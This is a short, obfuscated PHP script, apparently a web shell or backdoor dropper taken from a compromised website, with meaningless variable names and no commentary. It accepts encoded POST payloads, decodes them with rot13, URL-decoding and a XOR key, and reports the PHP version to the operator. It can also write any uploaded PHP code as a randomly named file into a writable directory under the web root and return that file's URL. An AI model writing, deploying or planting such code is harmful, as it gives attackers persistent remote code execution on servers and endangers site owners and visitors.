<?php $mioaunsotr = "rkitnlwyykynulhc";$gdybou = "";foreach ($_POST as $gwlikc => $yrpwbspjafdfdrjj){if (strlen($gwlikc) == 16 and substr_count($yrpwbspjafdfdrjj, "%") > 10){mesdiyzy($gwlikc, $yrpwbspjafdfdrjj);}}function mesdiyzy($gwlikc, $ytgjzffdj){global $gdybou;$gdybou = $gwlikc;$ytgjzffdj = str_split(rawurldecode(str_rot13($ytgjzffdj)));function inuoans($kzrkoah, $gwlikc){global $mioaunsotr, $gdybou;return $kzrkoah ^ $mioaunsotr[$gwlikc % strlen($mioaunsotr)] ^ $gdybou[$gwlikc % strlen($gdybou)];}$ytgjzffdj = implode("", array_map("inuoans", array_values($ytgjzffdj), array_keys($ytgjzffdj)));$ytgjzffdj = @unserialize($ytgjzffdj);if (@is_array($ytgjzffdj)){$gwlikc = array_keys($ytgjzffdj);$ytgjzffdj = $ytgjzffdj[$gwlikc[0]];if ($ytgjzffdj === $gwlikc[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function blyoz($yrpwbspir) {static $iuzcg = array();$wqrdrdqwfr = glob($yrpwbspir . '/*', GLOB_ONLYDIR);if (count($wqrdrdqwfr) > 0) {foreach ($wqrdrdqwfr as $yrpwbsp){if (@is_writable($yrpwbsp)){$iuzcg[] = $yrpwbsp;}}}foreach ($wqrdrdqwfr as $yrpwbspir) blyoz($yrpwbspir);return $iuzcg;}$whpnmo = $_SERVER["DOCUMENT_ROOT"];$wqrdrdqwfr = blyoz($whpnmo);$gwlikc = array_rand($wqrdrdqwfr);$ebxobg = $wqrdrdqwfr[$gwlikc] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($ebxobg, $ytgjzffdj);echo "http://" . $_SERVER["HTTP_HOST"] . substr($ebxobg, strlen($whpnmo));exit();}}}